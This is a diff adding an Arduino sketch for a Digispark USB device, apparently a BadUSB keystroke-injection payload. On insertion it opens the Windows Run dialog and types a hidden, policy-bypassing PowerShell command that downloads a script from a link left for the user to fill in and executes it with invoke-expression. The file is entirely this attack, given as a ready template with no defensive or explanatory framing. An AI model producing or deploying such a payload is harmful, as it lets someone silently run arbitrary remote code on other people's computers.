@@ -1,0 +1,16 @@
+#include "DigiKeyboard.h"
+
+void setup() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(500);
+
+  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
+  DigiKeyboard.delay(300);
+
+  DigiKeyboard.print("powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://< Your link for the script>?dl=1; invoke-expression $pl")
+}
+
+void loop() {
+  // put your main code here, to run repeatedly:
+
+}
